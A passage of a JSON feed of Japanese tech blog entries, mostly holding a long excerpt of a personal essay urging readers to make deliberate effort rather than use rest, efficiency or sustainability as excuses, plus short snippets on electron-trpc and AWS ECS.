\\r\\rhttps://forkwell.connpass.com/event/377267/\\r\\rhttps://syu-m-5151.hatenablog.com/archive/category/%E3%81%8A%E3%81%84%E3%80%81\\r\\r自宅からの昼登壇だったので、終わってから昼飯を食べに外に出た。参考書籍として紹介した本をもう一度読み返そうと思って、鞄に入れてきていた。店に向かう道すがら、本を開く。","isoDate":"2025-12-04T05:00:00.000Z","dateMiliSeconds":1764824400000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Electronアプリで型安全なIPC通信を実現する electron-trpcという選択肢","link":"https://zenn.dev/meziron/articles/82dfa259c30bf8","contentSnippet":"はじめにこの記事は 3-shake Advent Calendar 2025 の記事です。Electronアプリケーションの開発において、Main ProcessとRenderer Process間の通信（IPC）を型安全に実装することは、開発体験と保守性を高める上で重要な課題です。本記事では、electron-trpcを用いて、IPC通信の型安全性を効率的に確保する方法について解説します。 従来の課題：型定義の分散とボイラープレートElectron標準のIPC通信（ipcMain / ipcRenderer）を使用する場合、型安全性を確保しようとすると、記述量が増大しが...","isoDate":"2025-12-03T15:00:03.000Z","dateMiliSeconds":1764774003000,"authorName":"Daichi Kugimiya","authorId":"kugimiya"},{"title":"ECSのService ConnectとService Discoveryの違いを理解する","link":"https://zenn.dev/iorandd/articles/20251204_aws-ecs-beginner","contentSnippet":"本記事は若手AWS Leading Engineerを志す者達 Advent Calendar 2025の4日目の記事です。AWS Jr. Champions 2026 を目指すアドカレということで、業務でAmazon Elastic Container Service (ECS) を使ったマイクロサービス環境に触れる中で、Service Connect と Service Discoveryの違いを理解するために調べたことをまとめました。普段はスリーシェイクという会社でフルスタックエンジニアとしてWebアプリケーション開発に従事しています。会社の方でも3-shake Advent ...","isoDate":"2025-12-03T15:00:01.000Z","dateMiliSeconds":1764774001000,"authorName":"Itaru Ota","authorId":"iota"},{"title":"おい、努力しろ","link":"https://syu-m-5151.hatenablog.com/entry/2025/12/03/002023","contentSnippet":"はじめに「おい、がんばるな」という言葉を書いた。あの文章を読み返して、私は少し後悔している。syu-m-5151.hatenablog.com言いたいことは分かる。がむしゃらに頑張ることが思考停止になる。忙しさが逃避になる。持続可能性が大事だ。それは正しい。私も経験してきたことだ。でも、あの文章には、書かなかったことがある。書けなかったことがある。「頑張らなくていい」という言葉が、どれほど危険な響きを持っているか。その言葉が、どれほど簡単に、怠惰の免罪符になってしまうか。私は「頑張るな」と言った。でも、それを読んだ人の中に、こう受け取った人がいるだろう。「そうか、頑張らなくていいんだ」「無理しなくていいんだ」「今のままでいいんだ」と。もしそう受け取った人がいたら、それは私の責任だ。だから、今日は別のことを書く。「おい、努力しろ」これは、あの文章への補足ではない。あの文章への反論だ。「頑張るな」という言葉の危うさを、私は書かなければならない。そして、「頑張ること」と「努力すること」の違いを、もっと正確に伝えなければならない。あの文章で私が本当に言いたかったのは、「頑張るな」ではなかった。「考えずに頑張るな」だった。でも、その「考えずに」という部分が抜け落ちて伝わってしまったら、メッセージは正反対になる。「頑張らなくていい」は、時に正しい。でも、多くの場合、それは逃げだ。そして、私たちが本当に必要としているのは、「頑張らないこと」ではない。「正しく頑張ること」——つまり、努力することだ。このブログが良ければ読者になったり、nwiizoのXやGithubをフォローしてくれると嬉しい。「頑張らなくていい」という甘い毒「頑張らなくていい」という言葉は、優しく聞こえる。疲れ果てた人に、「もう頑張らなくていいよ」と言う。それは、救いの言葉だ。本当に限界に達している人には、その言葉が必要なときもある。でも、問題がある。この言葉は、本当に限界の人だけでなく、まだ余力がある人にも響いてしまうということだ。なぜか。人間は、楽な方に流れる生き物だからだ。これは誰もが持っている性質であり、責めるべきことではない。ただ、事実としてそうなのだ。「頑張らなくていい」と言われれば、「そうか、頑張らなくていいのか」と受け止める。そう感じること自体は自然だ。誰だって、許可があれば楽な方を選びたくなる。そして、頑張ることをやめる。でも、本当に頑張らなくてよかったのだろうか。ここで、正直に自分に問いかけてみてほしい。「頑張らなくていい」という言葉を聞いて、ホッとした時のことを思い出してほしい。その時、自分は本当に限界だっただろうか。本当に、これ以上一歩も進めない状態だっただろうか。体が動かない、頭が働かない、そういう状態だっただろうか。それとも、まだやれるのに、やらない言い訳を探していただけではなかっただろうか。私は、後者だったことが何度もある。疲れていた。それは本当だ。でも、限界ではなかった。もう少しやれば、もう少し先に進めた。「頑張らなくていい」という言葉が、私に許可を与えた。やめていい許可を。そして、私はやめた。その時は楽になった。肩の荷が降りた。「これでいいんだ」と感じた。でも、後から振り返ると、あの時やめなければよかったと後悔することがある。あと少し踏ん張っていれば、違う景色が見えただろう。あと少し続けていれば、突破口が開けただろう。「頑張らなくていい」は、甘い毒だ。本当に必要な人には薬になる。限界を超えて壊れそうな人には、その言葉が命を救うこともある。でも、必要でない人が飲むと、毒になる。成長の機会を奪い、可能性を閉じてしまう。そして、厄介なことに、自分が「本当に必要な人」なのかどうかは、自分では分からない。なぜなら、人間は自分に甘いからだ。自分の限界を、実際より低く見積もる傾向があるからだ。だから、この言葉は慎重に使わなければならない。そして、この言葉を聞いた時は、慎重に受け取らなければならない。「私は本当に限界なのか、それとも、逃げているだけなのか」。この問いから、逃げてはいけない。いまの自分にとって「頑張らなくていい」という言葉は、薬なのか、あるいは都合のいい麻酔なのか。その区別ができるのは、自分だけだ。誰かの優しさを、自分への甘さにすり替えるな。量をこなすことでしか見えないもの「甘い毒」の話をしてきた。次は、もう少し具体的な話をしたい。「量」の話だ。「おい、がんばるな」という文章で、私は「がむしゃらは若さの特権だ」と書いた。そして、「30歳からは戦略が必要だ」と書いた。これは、半分正しくて、半分間違っている。確かに、がむしゃらに量をこなすだけでは、どこかで限界が来る。効率を考えず、方向性を考えず、ただ時間を投入するだけでは、成果は出ない。それは正しい。でも、量をこなすことでしか見えないものがあるということを、私は書かなかった。どういうことか。何かを始めたばかりの頃、私たちは何も分からない。これは当然のことだ。何が正しいのか分からない。何が効率的なのか分からない。どの方向に進むべきか分からない。この状態で「効率」や「戦略」を考えても、意味がない。なぜか。効率や戦略を考えるためには、材料が必要だからだ。「このやり方は非効率だった」「あのやり方の方が良かった」という比較ができて、初めて効率が分かる。「この方向は間違いだった」「あの方向が正しかった」という経験があって、初めて戦略が立てられる。つまり、効率や戦略を語るためには、まず経験が必要なのだ。では、経験は、どこから来るのか。量をこなすことから来る。最初から効率的にやろうとすると、何が起きるか。何も始められなくなる。「どうやったら効率的か」を考えている間に、時間だけが過ぎていく。最適な方法を見つけようとして、いつまでも動き出せない。私はかつて、あるプログラミング言語を学ぼうとした時、まず「最も効率的な学習方法」を調べることに一週間を費やした。本を読み比べた。オンラインコースを比較した。学習ロードマップを作成した。「この本は評判がいい」「このコースは体系的だ」「こういう順序で学ぶべきだ」と、完璧な計画を立てようとした。一週間後、完璧な計画ができた。でも、一行もコードを書いていなかった。一方、別の言語を学んだ時は、何も考えずにチュートリアルを始めた。「とりあえずやってみよう」と思って、手を動かした。分からないところは飛ばした。エラーが出たら、エラーメッセージをググった。理解が曖昧なまま、とりあえず動くものを作った。非効率だった。無駄なことをたくさんした。後から「ああ、最初からこうすればよかった」と悔やむことが何度もあった。でも、後者の方が、圧倒的に速く身についた。なぜか。手を動かしていたからだ。手を動かすと、分からないことが具体化する。「何が分からないか分からない」という状態から、「これが分からない」という状態になる。そうなれば、調べようがある。学びようがある。これはエンジニアだけの話ではない。セールスも、CSも、デザイナーも、同じだ。セールスなら、100件の商談をこなして初めて「この業界の顧客は、この切り口で話すと響く」が分かる。CSなら、100件の問い合わせに対応して初めて「この機能のこの部分で、ユーザーはつまづく」が見えてくる。デザイナーなら、100個のプロトタイプを作って初めて「このパターンは使いやすい」という感覚が身につく。最初から「効率的なセールストーク」を設計しようとしても、机上の空論にしかならない。最初から「完璧なカスタマージャーニー」を描こうとしても、現実とズレる。まず量をこなすことで、何が効率的で、何が正しい方向なのかが、初めて見えてくる。これは、若者だけの話でもない。何か新しいことを始める時、誰もが初心者だ。30歳、40歳、50歳になっても、新しい領域に踏み出す時は、まず量をこなすしかない。「おい、がんばるな」で私が書いた「戦略」は、量をこなした後に見えてくるものだ。量をこなす前に戦略を立てようとしても、机上の空論にしかならない。だから、まず頑張れ。考えるのは、その後でいい。戦略を語りたければ、まず汗をかけ。効率を追求しすぎることの罠量をこなすことの価値を語った。では、量だけが大事なのか。そうではない。ここで、「効率」の話をしたい。「おい、がんばるな」で、私は効率の重要性を強調した。同じ成果を、より少ない投入で得ること。それが賢い働き方だと。これも、半分正しくて、半分間違っている。効率を追求することは、確かに重要だ。無駄なことに時間を使わない。最短距離で成果を出す。それは、賢いことだ。でも、効率を追求しすぎると、動けなくなるという罠がある。どういうことか。効率を追求するとは、「最小の投入で最大の成果を得ようとすること」だ。これ自体は良いことだ。でも、これを突き詰めると、どうなるか。「成果が保証されていないことには、投入しない」という態度になりやすい。なぜか。効率の計算をするためには、投入と成果の関係が見えている必要がある。「これだけ投入すれば、これだけの成果が得られる」という予測ができて、初めて効率が計算できる。だから、効率を重視するあまり、「成果が予測できること」だけを選ぶようになる。「この作業は、本当に必要か？成果につながるか？」「このアプローチは、本当に効率的か？もっと良い方法はないか？」「この投資は、本当にリターンがあるか？損をしないか？」。こう考え始めると、確実にリターンがあることにしか、時間を使えなくなる。でも、ここで立ち止まって考えてほしい。人生で最も価値のあるものは、リターンの不確実なものが多いのではないだろうか。新しいスキルを学ぶ。そのスキルが役に立つかどうかは、学ぶ前には分からない。学んでみて、使ってみて、初めて分かる。新しい人間関係を築く。その関係が実を結ぶかどうかは、関係を築く前には分からない。時間をかけて、信頼を積み重ねて、初めて分かる。新しいプロジェクトを始める。そのプロジェクトが成功するかどうかは、始める前には分からない。やってみて、失敗して、修正して、初めて分かる。効率を追求しすぎると、これらの「不確実なこと」に時間を使えなくなる。確実にリターンがあることだけをやるようになる。すると、どうなるか。安全な場所から出られなくなる。今までやってきたこと。確実にできること。リスクのないこと。そういうものだけをやり続ける。その結果、成長がない。変化がない。じわじわと、世界が狭くなっていく。新しいことに挑戦しないから、新しい可能性が開かれない。私は、効率を追求するあまり、「無駄なこと」を一切しなくなった時期がある。仕事に直接関係のない本は読まない。読んでも仕事の成果につながらないから。すぐに役立たない技術は学ばない。学んでも今の仕事では使わないから。「これは何の役に立つのか」が説明できないことには、時間を使わない。説明できないということは、効率が計算できないということだから。確かに、目の前の仕事は効率的にこなせるようになった。無駄がなくなった。短時間で成果が出るようになった。でも、新しいアイデアが浮かばなくなった。視野が狭くなった。仕事は回せるけど、面白い発想ができなくなった。つまらない人間になっていった。なぜか。「無駄」の中にこそ、予想外の価値があるからだ。一見無駄に見える読書が、思わぬところで仕事に活きる。すぐに役立たない技術が、数年後には大きな武器になる。「何の役に立つか分からない」経験が、人間としての厚みを作る。効率だけを追求すると、その「予想外の価値」を取りこぼしてしまう。だから、時には非効率を許容しろ。時には「何の役に立つか分からないこと」に時間を使え。それが、長期的には最も効率的な投資になることがある。効率やリターンが見えないことの中に、本当は心のどこかで「それでもやってみたい」と思っているものがないだろうか。その声を、効率という物差しで測って、黙らせていないだろうか。計算できないものにこそ、人生を変える何かが潜んでいる。「持続可能性」という名の逃げ道効率の話をしてきた。次は、もう1つの「賢そうな言葉」について考えたい。「持続可能性」だ。「おい、がんばるな」で、私は持続可能性の重要性を説いた。無理をしない。長く続けられるペースで。燃え尽きないように。これは正しい。燃え尽きて動けなくなったら、意味がない。長く続けることは確かに大事だ。でも、この言葉が逃げ道になることがある。どういうことか。「持続可能なペースで」と言うと、それは賢明に聞こえる。長期的な視点を持っている。自分を大切にしている。無理をしない。計画的だ。でも、その「持続可能なペース」は、本当に適切なのだろうか。ここで、人間の心理について考えてみたい。私たちは、自分の限界を過小評価しがちだ。「これ以上やったら壊れる」と感じる地点は、実際の限界よりもずっと手前にあることが多い。なぜか。人間は、不快なことを避けたい生き物だからだ。辛いこと、苦しいこと、面倒なことは、できれば避けたい。これは自然な感情だ。だから、実際に壊れるよりもずっと手前で、「もう限界だ」と感じてしまう。まだ余力があるのに、「これ以上は無理だ」と思ってしまう。「持続可能なペース」という言葉を使う時、私たちは無意識に、その「過小評価された限界」を基準にしていないだろうか。本当は、もう少し頑張れる。もう少し踏ん張れる。でも、「持続可能性」という言葉を使って、その踏ん張りを回避していないだろうか。「持続可能性」は、時に「楽をするための言い訳」になる。もちろん、本当に限界の人はいる。本当に休まなければならない人はいる。その人たちにとって、「持続可能性」は正当な理由だ。そういう人に「もっと頑張れ」と言うのは、暴力だ。でも、全員がそうではない。まだ余力があるのに、「持続可能性」を理由にブレーキをかけている人もいる。ここで、もう1つ正直に自分に問いかけてみてほしい。「持続可能なペース」と言った時、それは本当に「長期的に最適なペース」なのか。それとも、「今、楽でいられるペース」なのか。この2つは、似ているようで、全く違う。長期的に最適なペースは、時に短期的には辛い。なぜか。成長するためには、今の自分を超える必要があるからだ。今の自分を超えるためには、今の自分には辛いことをする必要がある。筋肉を鍛える時のことを考えてみてほしい。筋肉は、負荷をかけて、一度壊れて、修復される過程で強くなる。楽な負荷だけかけていても、筋肉は成長しない。能力も同じだ。今できることだけやっていても、能力は成長しない。今できないこと、今の自分には辛いことに挑戦して、初めて成長する。「持続可能性」を盾にして、その「辛いこと」を避けていたら、成長はない。踏ん張るべき時には、踏ん張れ。いつでも快適でいようとするな。不快さの中にこそ、成長がある。最近、「持続可能性のため」と言ってブレーキを踏んだ場面を思い出してほしい。それは本当に長期のためだっただろうか。それとも、今ラクでいたい自分のためだっただろうか。答えは、自分の中にしかない。「持続可能性」は免罪符じゃない。逃げ道を正当化する言葉でもない。苦しみの中でしか得られないものここまで、「甘い毒」「量」「効率」「持続可能性」の話をしてきた。これらに共通するのは、「苦しみとどう向き合うか」という問いだ。次は、その「苦しみ」について、もう少し直接的に語りたい。「おい、がんばるな」で、私は「苦しみを美化するな」と書いた。苦しむこと自体には価値がない。同じ成果を楽に得られるなら、その方がいいと。これも、半分正しくて、半分間違っている。確かに、苦しむこと自体を目的にするのは間違っている。苦しめば偉いわけではない。苦労すれば成果が出るわけではない。無意味な苦しみは、ただの消耗だ。でも、苦しみの中でしか得られないものがあるということも、事実だ。それは何か。自分が何者であるかを知ることだ。どういうことか。人間は、追い込まれた時に、本当の自分が出る。楽な時、余裕がある時には、本当の自分は見えない。余裕があると、取り繕える。自分を良く見せられる。でも、苦しみの中では、取り繕う余裕がなくなる。本当の自分が、否応なく姿を現す。自分は、どこまで耐えられるのか。限界だと思った先に、まだ力が残っているのか。自分は、何を諦められないのか。何を捨てても、これだけは手放せないというものは何なのか。自分は、何のために頑張れるのか。お金のためか、評価のためか、それとも、もっと別の何かのためか。これらの問いに対する答えは、快適な場所にいては見つからない。不快な場所に身を置いて、初めて見えてくる。私は、あるプロジェクトで、本当に追い込まれた経験がある。締め切りは迫っている。スケジュールは遅延している。チームは疲弊している。メンバーの顔に疲労が見える。問題は山積みだ。1つ解決すると、別の問題が浮上する。毎日が綱渡りだった。辛かった。何度も逃げ出したいと思った。「こんなの、持続可能じゃない」と思った。「なんでこんなことをしているんだろう」と思った。でも、あの経験がなければ、今の自分はいない。これはエンジニアだけの話ではない。セールスなら、どうしても落とせない大型案件に挑み続けた経験。何度も断られ、それでも食らいついた経験。その中で「自分は何のために営業をしているのか」が見えてくる。CSなら、クレームが殺到した時期を乗り越えた経験。理不尽に怒られ、なお丁寧に対応し続けた経験。その中で「自分はどこまでユーザーに寄り添えるのか」が見えてくる。現場で働くすべての人に、そういう経験がある。あの時、自分が何を大切にしているのかが分かった。チームのために最後まで踏ん張りたいと思っている自分がいた。良いものを作りたいと思っている自分がいた。自分がどこまで頑張れるのかが分かった。「もう無理だ」と思ったところから、より三歩進めた。限界だと思っていたところは、限界ではなかった。そして、自分がそこまで頑張れるという自信が、あの経験から生まれた。この自信は、快適な場所では得られない。苦しみを乗り越えた経験からしか得られない。「あの時、あれだけ辛いことを乗り越えた」という記憶は、次の困難へ立ち向かう力になる。「あの時できたのだから、今回もできる」という自信は、前へ進む勇気になる。だから、苦しみを避けるな。もちろん、無意味な苦しみは避けるべきだ。方向が間違っているなら、修正すべきだ。でも、正しい方向に進んでいるなら、苦しみを恐れるな。その苦しみの中に、あなたのまだ知らない自分がいる。苦しみを避けて到達する場所に、本当の自分はいない。「休むこと」を過大評価していた苦しみの話をしてきた。では、苦しみの反対にある「休息」は、どうだろうか。「おい、がんばるな」で、私は休むことの重要性を強調した。休憩は投資だ。睡眠は投資だ。休むことで、生産性が上がると。これは正しい。休息は大事だ。睡眠不足は判断力を鈍らせる。疲労は生産性を下げる。でも、休むことを過大評価していたという反省もある。どういうことか。休むことが重要なのは、その後にまた頑張るためだ。休息は、次の活動のための準備だ。体を回復させ、頭をリフレッシュさせ、また動き出すための準備だ。つまり、休息の価値は「その後の活動」によって決まる。休んだ後に何もしないなら、休息の意味がない。でも、「休むことが大事」という言葉を聞くと、休むこと自体が目的になってしまうことがある。「今日は休む日だから、何もしない」「疲れているから、休まなきゃ」「持続可能性のために、休息を取る」。そう言いながら、ずっと休んでいる。次の活動が、いつまでも始まらない。休息は、活動のための手段だ。休息自体が目的ではない。この区別を忘れると、「休むこと」が「何もしないこと」にすり替わってしまう。私は、「休息も投資だ」と言いながら、実際には逃避していた時期がある。「今日は休む」と言いながら、本当は面倒なことを避けていた。やるべきことがあるのに、「疲れているから」と言って、やらなかった。「持続可能性のため」と言いながら、実際には楽をしていた。もう少し頑張れる状態なのに、「無理は禁物だから」と言って、手を抜いた。休息と逃避は、外からは区別がつかない。どちらも「何もしていない」ように見える。区別できるのは、自分だけだ。これはエンジニアだけの話ではない。セールスなら、「今日は疲れているから、あのリードへの連絡は明日にしよう」と言い続けて、結局連絡しないまま案件を逃すことがある。CSなら、「この問い合わせは複雑だから、体調が良い時に対応しよう」と言い続けて、対応が遅れてユーザーの信頼を失うことがある。どの職種でも、「休息」と「先延ばし」の境界は曖昧だ。自分に正直に問いかけてほしい。今、休んでいるのは、次に頑張るための準備なのか。それとも、頑張ることから逃げているだけなのか。この2つは、外見は同じでも、本質は全く違う。次に頑張るための休息には、終わりがある。回復したら、また動き出す。頑張ることからの逃避には、終わりがない。いつまでも「まだ疲れている」「まだ準備ができていない」と言い続ける。前者なら、休め。後者なら、立ち上がれ。休息は充電だ。放電しないなら、充電する意味はない。「考えること」を言い訳にするな休息の話をしてきた。次は、もう1つの「賢そうな行為」について考えたい。「考えること」だ。「おい、がんばるな」で、私は「考えること」の重要性を説いた。がむしゃらに動くな。立ち止まって考えろ。方向性を確認しろと。これは正しい。考えずに動くと、間違った方向に全力で進んでしまう。それは危険だ。でも、「考えること」が行動しない言い訳になることがある。どういうことか。「まだ考えがまとまっていない」「もう少し情報が必要だ」「方向性を確認してから動きたい」。こう言いながら、いつまでも動かない人がいる。考えることは大事だ。でも、考えているだけでは、何も起きない。なぜか。世界は、行動によってしか変わらないからだ。頭の中でどれだけ完璧な計画を立てても、行動しなければ、現実は何も変わらない。素晴らしいアイデアがあっても、実行しなければ、ただの妄想だ。そして、皮肉なことに、行動しないと、本当に必要な情報は手に入らない。何かを始める前は、何が分からないかも分からない。何が問題になるかも分からない。どこが難しいかも分からない。頭の中で考えているだけでは、これは分からない。机上で計画を立てているだけでは、見えてこない。実際にやってみて初めて分かる。手を動かし、困難にぶつかり、失敗して初めて「ああ、ここが問題だったのか」と分かる。だから、「もっと考えてから」「もっと情報を集めてから」と言い続けていると、永遠に動き出せない。必要な情報は、動き出さないと手に入らないからだ。これはエンジニアだけの話ではない。セールスなら、「この業界のことをもっと調べてから提案しよう」と言い続けて、結局一度も商談に臨まないことがある。しかし、実際に商談に出て、顧客の反応を見て、初めて「この業界は価格よりもサポート体制を重視する」が分かる。CSなら、「この機能の仕様をもっと理解してから対応しよう」と言い続けて、結局ユーザーを待たせてしまうことがある。ただ、実際に対応しながら調べ、先輩に聞くことで「この機能は、こういう使い方をするユーザーがいる」と分かる。どの職種でも、動くことでしか得られない知識がある。これは鶏と卵のような問題に見えるだろう。動くためには情報が必要だ。しかし、情報を得るためには動く必要がある。どうすればいいのか。答えは、不完全なまま動き始めることだ。完璧な計画を待つな。不完全なまま始めろ。間違っているだろう。失敗するだろう。それでも、始めなければ、何も始まらない。動きながら考えろ。走りながら修正しろ。考えることと動くことは、どちらか一方ではない。順番に行うものでもない。両方同時にやるものだ。動きながら考え、考えながら動く。そうすることで、より良い方向に、より速く進める。「まだ準備ができていない」「もう少し考えてから」と言って先送りしていることがあるなら、立ち止まって考えてみてほしい。それは本当に考える段階なのか。それとも、動くことを怖がっているだけなのか。考えることと、考えているふりをして逃げることは、違う。準備が整う日は、永遠に来ない。来たと思える日は、動き始めた後にしか訪れない。では、何が「努力」なのかここまで、「頑張らなくていい」という言葉の危うさを書いてきた。量をこなすことの価値。効率を追求しすぎることの罠。持続可能性が逃げ道になること。苦しみの中でしか得られないもの。休むことの過大評価。考えることが言い訳になること。では、結局、何をすればいいのか。ここで、「頑張ること」と「努力すること」を区別したい。頑張ることは、「とにかくやること」だ。方向も考えず、効率も考えず、ただ時間とエネルギーを投入する。がむしゃらに動く。汗をかく。疲れる。これは「おい、がんばるな」で批判したことであり、確かに問題がある。方向が間違っていたら、どれだけ頑張っても成果は出ない。努力することは、「考えながらやること」だ。方向を意識し、フィードバックを得て、修正しながら進む。効率を考える。戦略を立てる。ただ、考えるだけでなく、実際に動く。これは、頑張ることとは違う。しかし、努力には「やること」が含まれている。ここが重要なポイントだ。「考えること」だけでは、努力ではない。「やること」が必要だ。そして、「やること」には、しばしば苦しみが伴う。不快さが伴う。疲労が伴う。それを避けていたら、努力にはならない。努力とは、正しい方向に向かって、苦しみを引き受けながら、行動し続けることだ。もう少し分解して説明しよう。まず、「正しい方向に向かって」。これは、考えることだ。自分は何を達成したいのか。どこに向かいたいのか。そのためには、何をすべきか。これを考える。次に、「苦しみを引き受けながら」。これは、踏ん張ることだ。辛くても、やる。不快でも、続ける。逃げ出したくなっても、踏みとどまる。そして、「行動し続ける」。これは、動くことだ。考えるだけでなく、実際に手を動かす。失敗しても、また動く。続ける。この三つが揃って、初めて「努力」になる。これはどの職種でも同じだ。エンジニアなら、正しいアーキテクチャを考え、難しいバグと格闘しながら、コードを書き続ける。セールスなら、顧客の課題を考え、断られる辛さを引き受けながら、提案を続ける。CSなら、ユーザーの真のニーズを考え、クレームの辛さを引き受けながら、対応を続ける。デザイナーなら、ユーザー体験を考え、何度もダメ出しされる辛さを引き受けながら、デザインを続ける。どの仕事でも、努力の構造は同じだ。「頑張るな」と言って、苦しみを避けることを正当化してはいけない。苦しみは、努力の一部だ。「考えろ」と言って、行動しないことを正当化してはいけない。行動は、努力の一部だ。方向を考えながら、苦しみを引き受けながら、行動し続ける。それが、努力だ。楽をしながら成長はできない。考えるだけで変わることもできない。誘惑という名の逃げ道努力の定義をした。正しい方向に向かって、苦しみを引き受けながら、行動し続けること。それが努力だと書いた。しかし、ここで正直に認めなければならないことがある。努力するのは、難しい。なぜか。現代社会には、努力から逃げるための誘惑が溢れているからだ。スマホを開けばSNSが待っている。通知が鳴り続ける。動画は自動再生される。情報は洪水のように押し寄せる。疲れた時、辛い時、つい手が伸びる。「ちょっと休憩」と言いながら、気づけば1時間、2時間が過ぎている。これは、休息ではない。逃避だ。先ほど「休むことの過大評価」の話をした。ここでも同じことが起きている。私たちは「少し気分転換」と言いながら、実際には努力から逃げている。ここで、1つの考え方を紹介したい。ジェイ・シェティという作家がいる。彼は実際に僧侶として修行した経験を持ち、その経験をもとに「モンク思考」という考え方を世界に広めた。私たちはつい、他人と年収を比べたり、社会的なイメージで仕事を選んだりしてしまう。「成功とはこういうもの」「幸せとはこういうもの」という外側からの定義に、無意識に縛られている。しかし、本当はどのような人生を送りたいのか。本当はどのような人間になりたいのか。この問いに、自分の言葉で答えられるだろうか。彼が説くのは、「手放す」「成長する」「与える」という3つのステップだ。まず、執着を手放す。他人の評価、過去の成功体験、「こうあるべき」というプレッシャー。これらを握りしめていると、本当に大切なものが見えなくなる。次に、自分の情熱と才能に向き合う。何をしている時に時間を忘れるか。何に取り組んでいる時に充実感を感じるか。他人の期待ではなく、自分の内側から湧き上がるものを見つける。そして、目的を持って生きる。自分のためだけに努力するのではなく、誰かのために、何かのために努力する。その方が、長く続く。強く踏ん張れる。この考え方の核心は、「小さなノー」の積み重ねだ。SNSを見ない。無駄な飲み会を断る。ダラダラとネットサーフィンしない。1つ1つは小さな「ノー」だ。しかし、この小さな「ノー」を積み重ねることで、本当に大切なことに「イエス」と言えるようになる。誘惑に「ノー」と言うことで、努力に「イエス」と言える。私たちは、誘惑に負けるたび、自分を少しずつ裏切っている。「今日くらいいいか」「疲れているから仕方ない」「明日から頑張ろう」。そう言いながら、努力から逃げている。その言い訳を、いつまで続けるのか。永遠に僧侶のように生きる必要はない。ただ、誘惑を言い訳にするのをやめろ。集中できないのは環境のせいではない。自分が誘惑を選んでいるだけだ。スマホを閉じろ。通知をオフにしろ。そして、今やるべきことに向き合え。それが、努力の第一歩だ。踏ん張るべき時に踏ん張れ努力の定義をした。最後に、1つのことを言いたい。人生には、踏ん張るべき時がある。チャンスは、いつでも来るわけではない。絶好の機会は、そう何度もあるわけではない。その時が来た時に踏ん張れるかどうかで、人生は変わる。踏ん張るべき時に「持続可能性が」と言って引いてしまったら、チャンスを逃す。踏ん張るべき時に「効率が」と言って計算してしまったら、大事なものを取りこぼす。踏ん張るべき時に「休息が」と言って立ち止まってしまったら、流れに乗れない。踏ん張るべき時には、理屈を超えて、踏ん張れ。これはどの職種でも同じだ。エンジニアなら、リリース前の追い込み、障害対応、重要な技術選定の議論。セールスなら、年度末のクロージング、大型案件のコンペ、重要な顧客との交渉。CSなら、大規模障害時のユーザー対応、重要顧客の離脱防止、クリティカルなクレームへの対応。どの仕事にも、「ここが勝負所」という瞬間がある。その瞬間に踏ん張れるかどうかで、キャリアは変わる。もちろん、いつも踏ん張れとは言わない。いつも踏ん張っていたら、壊れる。それは「おい、がんばるな」で書いた通りだ。だからこそ、踏ん張るべき時を見極めることが大事だ。普段は力を温存し、ペースを守り、回復する時間を取る。そして、その時が来たら、全力で踏ん張ることが大事だ。温存していた力を、すべて出し切る。「おい、がんばるな」は、「いつも踏ん張っている人」に向けた言葉だった。常にアクセル全開で、休むことを知らない人。そういう人には、確かに「踏ん張りすぎるな」と言う必要がある。一方で、世の中には、踏ん張るべき時に踏ん張れない人もいる。チャンスが来ても、「疲れているから」「リスクがあるから」「まだ準備ができていないから」と言って、見送ってしまう人。そういう人に「頑張らなくていい」と言ったら、それは間違ったメッセージになる。自分がどちらのタイプか、正直に考えてほしい。いつも踏ん張りすぎて疲弊しているなら、少し力を抜いていい。しかし、踏ん張るべき時に踏ん張れていないなら、今こそ踏ん張る時だ。この一年を振り返ってみてほしい。「あそこであと一歩踏ん張っていれば」と、未来の自分に言われそうな場面はないだろうか。もしあるなら、それが答えだ。次にその場面が来た時、同じ後悔をしないために、今から準備しておくことだ。チャンスは、準備している人のところにしか来ない。来ても、踏ん張れなければ、すり抜けていく。何もしなくても誰かがお膳立てしてくれて、機会が向こうからやってくる。そんな恵まれた環境が、いつまでも続くと信じるな。続いたとしても、それは成長ではない。ただの停滞だ。ここで、厳しいことを言う。世の中は理不尽で、不公平だ。生まれた環境も、与えられた才能も、巡ってくる機会も、平等ではない。それは事実だ。口で何を言っても、不満を並べても、愚痴をこぼしても、その現実は変わらない。SNSで正論を叫んでも、飲み会で上司の悪口を言っても、世の中は1ミリも動かない。行動しなければ、努力しなければ、状況は何も変わらない。これは冷たい言葉ではない。むしろ、希望の言葉だ。なぜなら、行動すれば変わる可能性があるということだからだ。理不尽な世界の中で、自分の手で変えられるものがある。それが、努力だ。ここで、1つの反論が聞こえてくる。「そもそも、このゲーム自体がおかしいのではないか」と。努力すれば成功者が増えるのか。全員が頑張れば、全員が報われるのか。答えはノーだ。構造的に、成功者の席は限られている。全員が努力しても、椅子取りゲームの椅子は増えない。格差は縮まるどころか、広がり続ける。能力主義という名のレースは、走れば走るほど、差が開いていく仕組みになっている。それは、経済学的にも、社会学的にも、既に答えが出ている話だ。では、このゲームから降りればいいのか。「こんな不公平なレースには参加しない」と宣言すればいいのか。私は、その選択を否定しない。降りる自由はある。しかし、自分に問いかけてみてほしい。降りたところで、何が開けるのか。レースから降りた先に、別の人生があるのか。不参加を表明したところで、この社会の中で生きていくことに変わりはない。構造を批判しながら、その構造の中で生きていく。それが、大半の人間の現実だ。だから私は、こう考える。ゲームがおかしいことは分かっている。ルールが不公平なことも分かっている。それでも、このゲームの中で生きていく以上、このゲームの中での戦い方を身につけるしかない。構造を変えることは、個人の努力ではほぼ不可能だ。でも、構造の中での自分の位置を変えることは、できる可能性がある。それが、努力だ。大事なのは、その理不尽さや不公平さを、腹の底から受け入れることだ。「なぜ自分だけ」「もっと恵まれていれば」という思いを抱えたまま努力しても、どこかで折れる。被害者意識を持ったまま走っても、長くは続かない。世の中が不公平であることを認めた上で、それでも前に進む。不公平を嘆く暇があるなら、その時間で一歩でも進め。理不尽に怒るエネルギーがあるなら、そのエネルギーを努力に変えろ。それが、この不完全な世界で生き抜くための唯一の方法だ。努力せずに目標が達成できると、本気で信じているなら教えてほしい。努力もせずに、この淀んだ自分という檻から抜け出せると、本気で信じているなら教えてほしい。私は信じていない。自分を変えるには、努力が必要だ。今の自分を超えるには、苦しみを引き受ける必要がある。檻から出るには、その困難を押し続ける必要がある。それを避けて、「頑張らなくていい」という言葉に逃げ込んでも、檻は壊れない。自分は変わらない。淀んだ水は、そのまま淀み続ける。努力なしに変われると信じるな。苦しみなしに成長できると信じるな。檻を壊すのは、他の誰でもない、自分自身だ。ここまで厳しいことを書いてきた。しかし、1つだけ、白状させてほしい。私は、自分のことを特別だと思えたことがない。ふとした瞬間に気づく。ああ、俺は凡人だな、と。天才じゃない。選